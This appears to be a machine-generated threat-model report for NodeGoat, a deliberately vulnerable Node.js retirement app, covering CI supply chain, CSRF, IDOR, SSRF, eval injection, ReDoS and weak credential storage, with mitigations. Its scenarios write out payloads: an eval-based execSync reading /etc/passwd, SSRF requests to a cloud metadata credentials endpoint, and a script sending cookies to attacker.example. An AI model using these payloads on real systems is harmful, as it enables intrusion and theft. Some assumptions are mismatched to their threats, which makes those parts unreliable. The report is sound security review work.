threats.asset: integrity of the CI runner executing repository code
threats.attackScenario: The lint job at .github/workflows/lint.yml:26 runs `npx --no-install jshint@2.12.0 .` on every push and pull_request, fetching jshint and its transitive dependencies from the public registry with no lockfile or integrity pin, so an attacker who compromises or typosquats a jshint dependency version gets arbitrary code execution inside the ubuntu-latest runner that has already checked out the repository.
assumptions: The runner has unrestricted egress to the npm registry and no allow-listed package proxy.
threats.impactReason: Arbitrary code runs on the CI runner with access to the checked-out source and any workflow environment; persist-credentials: false limits token theft.
threats.likelihoodReason: Requires compromising an upstream npm package, but the job triggers automatically on every push and pull request including from forks.

mitigation.summary: Install the linter from the repository lockfile instead of resolving it at run time.
steps: Add jshint to devDependencies in package.json, commit the lockfile, and replace the step at .github/workflows/lint.yml:26 with `npm ci` followed by `npx jshint .`.
Pin actions/checkout and actions/setup-node to commit SHAs rather than the v2/v1 floating tags.

threats.title: Session cookie theft over plaintext HTTP lets an attacker impersonate an end user at POST /login
threats.asset: session cookie and login credentials of the end user
threats.attackScenario: server.js creates the app over plain `http` with the HTTPS key/cert loading commented out at lines 18-28, so an attacker on the same network as the employee's browser sniffs the POST /login body (userName/password) handled at app/routes/index.js:34 and the connect.sid cookie returned afterwards, then replays the cookie to act as that employee.
assumptions: No TLS-terminating reverse proxy or load balancer is placed in front of the Node process in the deployed environment.
threats.impactReason: Credentials and the session cookie give full access to the victim's retirement profile, including SSN and bank account numbers.
threats.likelihoodReason: Requires a network position on the path between the browser and the app, but no application-level obstacle exists once there.

mitigation.summary: Serve the app over HTTPS and mark the session cookie secure.
steps: Re-enable the https server block in server.js (lines 18-28) or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Set `cookie: { secure: true, httpOnly: true, sameSite: 'lax' }` in the express-session options in server.js.
Enable helmet.hsts() (the helmet dependency is already in package.json) so browsers refuse plaintext.

threats.title: End user can deny posting a memo or changing bank details because only errors are logged
threats.asset: audit trail of user authentication and profile/memo changes
threats.attackScenario: The only logging in the request path is console.error of stack traces in app/routes/error.js and "redirecting to login" in app/routes/session.js, so an employee who signs in at POST /login (app/routes/index.js:34) and then changes the bankAcc/bankRouting fields on POST /profile can later deny the change, since no record of the authenticated actor, timestamp or old value is kept anywhere.
assumptions: No external audit-logging middleware or reverse-proxy access log correlating session identity to write operations is deployed.
threats.impactReason: Fraudulent redirection of retirement payments to a new bank account cannot be attributed or reconstructed.
threats.likelihoodReason: Any logged-in employee benefits from the absence of an audit trail; no special skill is required.

mitigation.summary: Add an append-only audit log of authentication and sensitive write events.
steps: Log userId, source IP, timestamp and outcome for every POST /login and POST /signup in app/routes/session.js.
Log before/after values (with SSN and bank numbers masked) for POST /profile and POST /contributions.
Ship these logs to a store the application account cannot rewrite.

threats.title: Unpinned third-party actions and lint tool fetched at run time can be swapped under CI
threats.asset: build pipeline integrity and test artifacts
threats.attackScenario: The workflows reference `actions/checkout@v2`, `actions/setup-node@v1`, `actions/cache@v2` and `actions/upload-artifact@v2` by mutable tag, and .github/workflows/lint.yml line 26 downloads `jshint@2.12.0` from the registry with `npx --no-install`, so an attacker who compromises one of those upstream tags or the registry package republishes it and their code runs inside every E2E Test and Lint job, tampering with the checked-out source and uploaded cypress artifacts.
assumptions: The CI jobs resolve actions and npm packages from the public GitHub/npm registries at run time with no allowlist or checksum verification.
threats.impactReason: A substituted action executes with the job's token and filesystem access, letting it alter build output and exfiltrate anything present in the runner.
threats.likelihoodReason: Requires compromising an upstream action tag or npm package rather than direct access to this repository.

mitigation.summary: Pin all external actions and CI tooling to immutable digests/versions.
steps: Replace `uses: actions/checkout@v2` and the other action tags in .github/workflows/e2e-test.yml and .github/workflows/lint.yml with full commit SHAs.
Add jshint 2.12.0 to devDependencies (already present in package.json) and invoke it via `npx --no-install jshint .` after `npm ci` rather than fetching it from the network.

threats.title: CI workflow triggers on pull_request and runs repository-controlled npm lifecycle scripts
threats.asset: build pipeline and CI runner execution context
threats.attackScenario: Both .github/workflows/e2e-test.yml and .github/workflows/lint.yml trigger on `pull_request` and then run `npm ci` (which executes install lifecycle scripts from the PR's package.json/package-lock.json) and `NODE_ENV=test npm start`, so an outside contributor opens a pull request that adds a `postinstall` script or a malicious dependency to package.json and gets arbitrary code executed on the ubuntu-latest runner during the E2E Test job.
assumptions: The repository allows workflows to run on pull requests from forks without a maintainer approval gate.
threats.impactReason: Arbitrary code runs on the runner with access to the cached ~/.npm and ~/.cache directories and any secrets exposed to the job, and can poison test artifacts.
threats.likelihoodReason: Anyone able to open a pull request reaches the workflow; the only obstacle is any fork-approval setting the repository may have.

mitigation.summary: Restrict untrusted pull-request workflows and disable npm lifecycle scripts in CI.
steps: Run `npm ci --ignore-scripts` in the Install dependencies step of .github/workflows/e2e-test.yml so PR-supplied lifecycle scripts do not execute.
Require manual approval for workflow runs from first-time/fork contributors in repository Actions settings.
Set explicit least-privilege `permissions:` blocks (e.g. `contents: read`) on both jobs in .github/workflows/e2e-test.yml and .github/workflows/lint.yml.

threats.title: Failed E2E runs upload Cypress videos and screenshots of the app containing seeded PII
threats.asset: test artifacts containing rendered application screens (profile SSN, DOB, bank account and routing fields)
threats.attackScenario: On test failure .github/workflows/e2e-test.yml lines 49-60 move test/e2e/videos and test/e2e/screenshots into an artifact named `cypress-artifacts-node<version>` and upload it with `--config video=true`, so anyone who can view the workflow run downloads the artifact and watches the recorded /profile and /allocations pages, reading the seeded SSN, date of birth, address and bank routing values the specs typed in.
assumptions: The e2e fixtures use data that is sensitive or mirrors production values.
The repository (and therefore its Actions artifacts) is readable by parties who should not see the data the e2e specs enter into /profile.
threats.impactReason: Recorded videos capture full application pages including the profile form fields that hold SSN, DOB and bank account numbers.
threats.likelihoodReason: Artifacts are uploaded automatically on any failing run and are downloadable by everyone with read access to the workflow run.

mitigation.summary: Stop recording sensitive screens and shorten artifact retention.
steps: Keep `"video": false` from cypress.json instead of overriding it with `--config video=true` in .github/workflows/e2e-test.yml line 47, or mask profile/bank fields in the specs.
Set `retention-days: 1` on the actions/upload-artifact step in .github/workflows/e2e-test.yml.
Ensure e2e fixtures under test/e2e/fixtures contain only synthetic, non-sensitive identifiers.

threats.title: Unauthenticated MongoDB in docker-compose allows tampering with users and financial records
threats.asset: users, allocations, contributions and memos collections (SSN, DOB, bank account and routing numbers)
threats.attackScenario: The mongo service in docker-compose.yml runs mongo:4.4 with no --auth and the web service connects with the credential-less URI mongodb://mongo:27017/nodegoat, so anyone who reaches TCP 27017 on the container network (for example via the host-published 27017 from the `docker-mongo` npm script, or another container on the same bridge) connects with the mongo shell and reads or rewrites the users collection, changing a victim's bank routing number or elevating their isAdmin flag.
assumptions: The MongoDB deployment is started as configured in docker-compose.yml without an enabled authentication mechanism or network restriction beyond the compose bridge.
threats.impactReason: Full read/write access to every collection, including SSN, DOB and bank account numbers, with no audit trail.
threats.likelihoodReason: No credential is required at all; reachability depends only on network position, and the docker-mongo script publishes 27017 to the host.

mitigation.summary: Enable MongoDB authentication and supply credentials through MONGODB_URI.
steps: Add MONGO_INITDB_ROOT_USERNAME/MONGO_INITDB_ROOT_PASSWORD to the mongo service in docker-compose.yml and run mongod with --auth.
Create a least-privilege application user scoped to the nodegoat database and put its credentials in the MONGODB_URI environment variable consumed by config/env/all.js:3.
Never publish 27017 to the host; remove or gate the `docker-mongo` script in package.json.

threats.title: No authentication on MongoDB means database writes cannot be attributed to any actor
threats.asset: integrity of the audit trail for the allocations and users collections
threats.attackScenario: Because the nodegoat database is reached over the shared mongodb://mongo:27017/nodegoat URI with no per-user credential and no server auditing configured in docker-compose.yml, an attacker who modifies a contribution percentage or a memo directly in the collection leaves records indistinguishable from legitimate application writes, and the operator cannot prove who made the change.
assumptions: MongoDB auditing/profiling is not enabled on the mongo:4.4 container and no external write log exists.
threats.impactReason: Fraudulent changes to contributions or memos cannot be attributed or reliably reconstructed.
threats.likelihoodReason: Requires network access to the database first, but once there no logging stands in the way.

mitigation.summary: Enable authenticated, per-identity access and server-side auditing for the nodegoat database.
steps: Enable --auth and distinct application/admin users in the mongo service of docker-compose.yml.
Turn on MongoDB's audit log (or at minimum the database profiler for write operations) and ship it off-host.

threats.title: Denial of service against the nodegoat datastore via vulnerable mongodb 2.2.36 driver
threats.asset: availability of the nodegoat database connection for the web application
threats.attackScenario: package.json:18 pins mongodb ^2.1.18 resolving to 2.2.36, which is affected by GHSA-mh5c-679w-hh4r; an attacker who can influence the values the app passes into driver calls (or the BSON returned over the credential-less mongodb://mongo:27017/nodegoat connection) triggers the driver denial-of-service and takes down the application's access to the users, allocations and memos collections.
threats.impactReason: The application loses all database access, making login and every account page unavailable until restart.
threats.likelihoodReason: A published advisory exists for the pinned version, though exploitation needs attacker influence over driver input or server responses.

mitigation.summary: Upgrade the mongodb driver past the fixed version 3.1.13.
steps: Bump "mongodb" in package.json from ^2.1.18 to a supported 3.x/4.x release and update the connection code for the new driver API.
Add an automated dependency audit step to .github/workflows so advisories fail the build.

threats.title: Cross-site request forgery on state-changing POSTs (/profile, /contributions, /benefits, /memos)
threats.asset: user PII stored via /profile (SSN, DOB, bank account and routing numbers) and contribution percentages
threats.attackScenario: csurf is a declared dependency but its require is commented out at server.js:7 and no CSRF token middleware is mounted on the POST routes at app/routes/index.js:48-67, so an attacker hosts a page that auto-submits a form to https://nodegoat.example/profile with attacker-chosen bankAcc and bankRouting values and a logged-in victim's ambient session cookie silently rewrites their banking details.
assumptions: No token or Origin/Referer check is applied by middleware mounted in server.js.
The express-session cookie is sent on cross-site POSTs, i.e. SameSite is not set to Lax/Strict.
threats.impactReason: An attacker can silently rewrite a victim's bank account and routing numbers and their contribution allocations.
threats.likelihoodReason: Requires luring an authenticated victim to an attacker page, but the forms are simple urlencoded POSTs with no token.

mitigation.summary: Mount CSRF protection using the csurf dependency already in package.json.
steps: Uncomment the csurf require at server.js:7 and app.use(csrf()) after the session middleware.
Emit the token as a hidden field in app/views/profile.html and the contributions, benefits and memos forms.
Set cookie: { sameSite: 'strict', httpOnly: true, secure: true } on the express-session configuration in server.js.

threats.title: No rate limiting on POST /login and POST /signup allows credential brute force and account flooding
threats.asset: user account credentials for the RetireEasy accounts
threats.attackScenario: POST /login at app/routes/index.js:34 calls userDAO.validateLogin with no attempt counter or lockout, so an unauthenticated attacker scripts thousands of requests against a known username with a password list until validateLogin succeeds and returns a session for that account.
assumptions: No account lockout or backoff is implemented in UserDAO.validateLogin.
No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
No rate-limiting middleware or upstream WAF throttles requests to /login and /signup.
threats.impactReason: A guessed password yields full access to the victim's PII including SSN and bank details.
threats.likelihoodReason: The login route is reachable by any unauthenticated stranger and the attack is fully scriptable. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Throttle and lock out repeated authentication failures.
steps: Add an IP- and username-keyed attempt counter in front of sessionHandler.handleLoginRequest in app/routes/index.js:34, with exponential backoff after five failures.
Apply the same throttle to POST /signup at app/routes/index.js:38 to stop bulk account creation.

threats.title: Missing function-level access control lets any user read and rewrite all employees' benefits
threats.asset: all non-admin users' benefit start dates and the employee roster
threats.attackScenario: GET/POST /benefits at app/routes/index.js:55-56 are guarded only by isLoggedIn while the isAdmin middleware is commented out at lines 57-59, and updateBenefits takes userId straight from req.body (app/routes/benefits.js:29-35), so an ordinary employee signs up, opens /benefits to list every non-admin user, then POSTs userId=<victim>&benefitStartDate=2030-01-01 to alter another employee's benefits.
assumptions: No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
No role check exists in middleware upstream of app/routes/index.js for the /benefits routes.
threats.impactReason: The full employee roster is disclosed and benefit records for arbitrary users can be overwritten.
threats.likelihoodReason: The admin-only route is reachable by any authenticated self-registered account with a single HTTP request. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Re-enable the admin role check on both /benefits routes and validate the target user.
steps: Restore isAdmin in app/routes/index.js:55-56 so the routes read app.get("/benefits", isLoggedIn, isAdmin, ...) and app.post("/benefits", isLoggedIn, isAdmin, ...).
Validate benefitStartDate and confirm the posted userId belongs to a non-admin user inside app/routes/benefits.js:29.

threats.title: Open redirect through the url query parameter on GET /learn
threats.asset: user session credentials harvested on an attacker-controlled phishing page
threats.attackScenario: GET /learn at app/routes/index.js:70-72 passes req.query.url directly into res.redirect with no allowlist or scheme check, so an attacker emails a logged-in employee the link https://nodegoat.example/learn?url=https://evil.tld/login and the trusted host bounces the victim to a cloned RetireEasy login form that captures their username and password.
assumptions: No input validation is applied to GET /learn, so any input it reads is used unvalidated.
No upstream middleware rewrites or validates the url query parameter before the handler runs.
threats.impactReason: Credential phishing and token leakage via the trusted domain; no direct server compromise.
threats.likelihoodReason: The redirect target is a single query parameter on a route any logged-in user can hit, and the link is trivially shareable. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate the redirect target against an allowlist of known learning-resource URLs.
steps: In app/routes/index.js:70, compare req.query.url against a fixed map of permitted destinations and redirect to a default page when it does not match.
Reject any value whose parsed origin is not in the allowlist rather than relying on string prefix checks.

threats.title: Server-side JavaScript injection via eval() of contribution fields on POST /contributions
threats.asset: the NodeGoat Node.js process and all data it can reach (user PII, memos, session store)
threats.attackScenario: handleContributionsUpdate passes req.body.preTax, req.body.afterTax and req.body.roth straight into eval() at app/routes/contributions.js:32-34, so an attacker who has signed up and logged in posts preTax=require('child_process').execSync('cat /etc/passwd').toString() (or a reverse-shell payload) to /contributions and executes arbitrary code inside the server process.
threats.impactReason: Arbitrary code execution as the application user gives full read/write on the Mongo connection, the session secret and all stored PII.
threats.likelihoodReason: Any self-registered account can POST the form field; the payload is a plain string in the request body and needs no special positioning.

mitigation.summary: Replace eval() with numeric parsing for the three contribution fields.
steps: Change app/routes/contributions.js:32-34 to use parseInt(req.body.preTax, 10) (the commented-out fix already present at lines 38-40).
Reject non-integer or out-of-range values before calling contributionsDAO.update.
Add a lint rule (no-eval) to the existing grunt/eslint config so eval cannot be reintroduced.

threats.title: Server-side request forgery and response reflection via the url parameter on GET /research
threats.asset: internal-network HTTP responses (e.g. cloud metadata credentials) returned through the /research page
threats.attackScenario: displayResearch concatenates req.query.url with req.query.symbol and fetches it with needle at app/routes/research.js:15-16, then writes the raw body into the response, so a logged-in attacker requests /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=role and reads internal metadata (and can inject HTML/JS into the page via the returned body).
assumptions: No egress allowlist or proxy restricts outbound requests made by needle.
The deployment has reachable internal HTTP endpoints such as a cloud metadata service or internal admin services.
threats.impactReason: Arbitrary internal URLs can be fetched and their bodies returned verbatim, which can expose cloud instance credentials and internal service data.
threats.likelihoodReason: Only a self-registered login is needed and the target URL is a plain query parameter.

mitigation.summary: Remove caller control over the fetch URL and stop echoing remote bodies.
steps: Hardcode the research provider base URL in app/routes/research.js and use only req.query.symbol, validated against /^[A-Z.]{1,8}$/, as the path segment.
Block link-local and private address ranges before calling needle.get.
Render the fetched data through the existing Swig template with escaping instead of res.write(body).

threats.title: Vulnerable express 4.16.4 and body-parser 1.18.3 expose open redirect, redirect XSS and DoS
threats.asset: availability of the Express process and the integrity of redirect responses served to users
threats.attackScenario: package.json pins express@4.16.4 and body-parser@1.18.3, so an attacker sends a urlencoded body crafted for CVE-2024-45590 to POST /login to burn CPU in body-parser, or a malformed URL to the res.redirect at app/routes/index.js:72 to exploit CVE-2024-29041/CVE-2024-43796 and inject script into the redirect response.
threats.impactReason: Denial of service against the single Node process plus reflected script execution in users' browsers via redirect handling.
threats.likelihoodReason: The vulnerable versions are pinned in package.json and the affected code paths (urlencoded body parsing, res.redirect) are reachable unauthenticated or with a basic login.

mitigation.summary: Upgrade express and body-parser past the fixed releases.
steps: Bump express to >=4.20.0 and body-parser to >=1.20.3 in package.json and regenerate the lockfile.
Re-run the dependency audit in the existing grunt test task after the upgrade.

threats.title: No per-user audit trail for benefit and profile changes leaves financial edits unattributable
threats.asset: audit record of who changed benefit start dates and profile banking details
threats.attackScenario: benefitsDAO.updateBenefits (app/routes/benefits.js:29-35) writes the posted userId and benefitStartDate with no log of the acting session, and the only logging in the codebase is console.error in app/routes/error.js, so a user who alters another employee's benefit start date leaves nothing linking the change to their account and can deny having made it.
assumptions: No application-level audit logging middleware records the acting session id for state-changing POSTs.
threats.impactReason: Financial record changes cannot be attributed or reconstructed during an investigation.
threats.likelihoodReason: Any authenticated user performing a state-changing POST benefits from the absent trail; no special effort is required.

mitigation.summary: Log the acting session and the before/after values for state-changing handlers.
steps: Add middleware mounted in app/routes/index.js that records req.session.userId, route, and request body keys for all POST handlers.
In app/routes/benefits.js and app/routes/profile.js, persist an audit document with the actor id, target user id and previous value on each update.

threats.title: Insecure direct object reference on GET /allocations/:userId exposes other employees' allocations
threats.asset: other users' retirement allocation records (stocks, funds, bonds)
threats.attackScenario: displayAllocations reads userId from req.params instead of req.session at app/routes/allocations.js:16-18 and queries allocationsDAO.getByUserIdAndThreshold with it, so an attacker logs in, notes their own id in the /allocations/{{userId}} nav link, and walks /allocations/1, /allocations/2 ... to read every other employee's allocation data.
assumptions: No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
User ids are small sequential integers, as the allocations nav link and parseInt(userId) usage suggest.
threats.impactReason: Every user's financial allocation record is readable one id at a time.
threats.likelihoodReason: Any registered account reaches the route and the id is a path parameter that is trivially enumerated. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Derive the allocations owner from the session rather than the URL.
steps: Use const { userId } = req.session; in app/routes/allocations.js:16 (the commented-out fix at lines 13-14).
If viewing another user must remain possible, add an explicit isAdmin check via sessionHandler.isAdminUserMiddleware on the route in app/routes/index.js:63.

threats.title: Catastrophic-backtracking regex on the bankRouting field allows single-request CPU exhaustion
threats.asset: availability of the single-threaded NodeGoat Express process
threats.attackScenario: handleProfileUpdate validates req.body.bankRouting with the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59, so an attacker logs in and POSTs bankRouting=11111111111111111111111111111111X to /profile, pinning the Node event loop and making the whole application unresponsive to every other user.
assumptions: No rate limiting or lockout is applied, so login and signup endpoints are vulnerable to brute-force attempts.
No request timeout or per-user rate limit sits in front of POST /profile.
threats.impactReason: Node.js is single-threaded, so one matching request blocks the event loop and denies service to all users.
threats.likelihoodReason: A single authenticated POST with a crafted 40-character string is enough, and it can be repeated cheaply. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Replace the nested quantifier with a linear-time pattern.
steps: Change the pattern at app/routes/profile.js:59 to /^([0-9]+)\#$/ as the comment at line 58 already suggests.
Length-limit bankRouting before matching it.

threats.title: Hard-coded session cookie secret allows forging of session cookies
threats.asset: session identifiers and the admin role flag
threats.attackScenario: config/env/all.js:8 defines `cookieSecret` as a literal in source rather than reading it from the environment as it does for `port` and `db`, so an attacker who reads the public repository mints a signed session cookie carrying a `userId` belonging to an admin account and passes both isLoggedInMiddleware (app/routes/session.js:36) and isAdminUserMiddleware (app/routes/session.js:25) without ever logging in.
assumptions: The deployed build uses this committed value rather than overriding it at runtime.
The express-session middleware is configured with config.cookieSecret from config/env/all.js.
threats.impactReason: A forged cookie grants any user identity including isAdmin, exposing every user's SSN, DOB and bank account details.
threats.likelihoodReason: The secret is committed in source and the session middleware is reachable by any unauthenticated visitor.

mitigation.summary: Load the session secret from the environment and rotate the committed value.
steps: Replace the literal at config/env/all.js:8 with `process.env.COOKIE_SECRET` and fail startup if it is unset.
Do the same for `cryptoKey` at config/env/all.js:9.
Rotate the secret and invalidate all existing sessions after deployment.

threats.title: Signup stores passwords in plaintext in the users collection
threats.asset: user account passwords
threats.attackScenario: UserDAO.addUser at app/data/user-dao.js:17-31 builds the user document with the raw `password` field straight from the POST /signup request body while the bcrypt.hashSync call is commented out, so anyone who reaches the Mongo `users` collection (a database dump, a backup, or an injection flaw elsewhere in the app) reads every account's cleartext password and replays it against /login and against users' other services.
assumptions: The commented-out bcrypt call is the only hashing step, so no hashing happens elsewhere before the document is inserted.
threats.impactReason: Every user's cleartext password, including admin accounts, is recoverable from a single collection read, and the passwords are reusable elsewhere.
threats.likelihoodReason: The storage weakness is unconditional on every signup; exploitation needs only one path to the users collection or its backups.

mitigation.summary: Hash passwords with bcrypt before insertion and compare hashes on login.
steps: Uncomment and use `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` in addUser at app/data/user-dao.js:25.
Change the comparePassword helper in validateLogin (app/data/user-dao.js:57 onwards) to use bcrypt.compareSync against the stored hash.
Write a migration that re-hashes or invalidates existing plaintext passwords and forces a reset.

threats.title: Login credentials and full user documents cross to the DAO layer without field-level protection
threats.asset: plaintext passwords and user records containing SSN, DOB and bank account numbers
threats.attackScenario: The session-to-dao flow carries the raw `userName`/`password` pair from handleLoginRequest (app/routes/session.js:53-58) into UserDAO.validateLogin and, on signup, into the users document unhashed, while ProfileDAO's encryption helpers for ssn, dob and bankAcc sit entirely commented out at app/data/profile-dao.js:15-40; an attacker with read access to the Mongo wire traffic or to the collections that this flow writes harvests cleartext credentials and bank routing numbers in a single pass.
assumptions: No field-level encryption is applied by the driver or by the database deployment.
The MongoDB connection built from config/env/all.js:3 is not configured with TLS.
threats.impactReason: The flow carries the highest-value data in the application - passwords, SSNs and bank account and routing numbers - in readable form.
threats.likelihoodReason: Requires a position on the application-to-database path or access to the database host, not a remote unauthenticated request.

mitigation.summary: Encrypt the transport and the sensitive fields carried on this flow.
steps: Append `?tls=true` (or set the driver's tls option) to the MONGODB_URI used at config/env/all.js:3 and require certificate validation.
Restore the crypto encrypt/decrypt helpers in app/data/profile-dao.js and apply them to ssn, dob, bankAcc and bankRouting in updateUser, sourcing cryptoKey from the environment.
Hash passwords in app/data/user-dao.js addUser so no cleartext credential is ever written over this flow.

threats.title: Outbound stock quote fetch is not pinned to HTTPS, allowing on-path tampering of the fetched body
threats.asset: fetched remote content rendered into the authenticated user's browser
threats.attackScenario: Because the destination is taken verbatim from req.query.url at app/routes/research.js:15 and no scheme check is applied, a request such as GET /research?url=http://finance.yahoo.com/quote/&symbol=IBM makes the server speak plaintext HTTP, letting a network attacker between the app host and the upstream substitute a response body that app/routes/research.js:25 writes straight into the victim's page.
assumptions: An attacker can position themselves on the network path between the application host and the upstream quote provider.
needle is invoked with default options, so no scheme restriction or certificate pinning is applied to the outbound request.
threats.impactReason: A substituted upstream body becomes HTML in the authenticated user's session, but the attacker needs network position rather than direct access to app data.
threats.likelihoodReason: Requires an on-path position between the application host and the upstream provider, though the plaintext scheme is trivially selected by the caller.

mitigation.summary: Force the outbound fetch to a fixed https base URL and reject non-https schemes.
steps: Hardcode the `https://finance.yahoo.com/quote/` base in app/routes/research.js instead of accepting req.query.url.
Assert the parsed URL protocol is `https:` before calling needle.get and return 400 otherwise.
Pass `rejectUnauthorized: true` in the needle.get options so invalid certificates fail the request.

threats.title: SSRF via attacker-controlled url parameter on GET /research reaching internal services
threats.asset: outbound request target URL and fetched remote content from internal-only endpoints
threats.attackScenario: The /research handler at app/routes/research.js:15 concatenates req.query.url with req.query.symbol and passes the result straight to needle.get with no scheme or host allowlist, so an authenticated attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=x and the server fetches the cloud metadata endpoint, writing the credential body back into the HTML response at line 25.
assumptions: The hidden url field in app/views/research.html is the only intended destination, and no egress proxy or network policy blocks link-local or internal addresses from the app host.
threats.impactReason: The server-side fetch runs from inside the application's network position, exposing cloud metadata credentials, internal admin panels and MongoDB HTTP interfaces that are otherwise unreachable.
threats.likelihoodReason: Any logged-in user can supply the url query parameter directly; no special tooling or position is needed and the form already carries the field.

mitigation.summary: Stop taking the fetch destination from the request and constrain needle.get to a fixed allowlisted host.
steps: In app/routes/research.js:15 drop req.query.url entirely and build the URL from a server-side constant base, e.g. `const url = "https://finance.yahoo.com/quote/" + encodeURIComponent(req.query.symbol);`.
Validate req.query.symbol against a strict pattern such as /^[A-Za-z.-]{1,10}$/ and reject anything else with a 400 before calling needle.get.
Remove the hidden url input from app/views/research.html:17 so the client no longer supplies a destination.
Configure needle.get with `follow_max: 0` so redirects cannot be used to pivot to an internal host.

threats.title: Remote content from the stock fetcher is written unescaped into the /research response
threats.asset: session cookies and user PII reachable from the authenticated browser session
threats.attackScenario: app/routes/research.js:18-25 sets Content-Type text/html and writes the raw needle response body into the page, so an attacker sends a victim a link to GET /research?url=https://attacker.example/&symbol=p whose response body contains `<script>fetch('https://attacker.example/x?c='+document.cookie)</script>`, executing in the victim's session on the application's own origin and exfiltrating the session cookie and profile data from /profile.
assumptions: No Content-Security-Policy response header restricts inline script on the application origin, and the session cookie is readable by script.
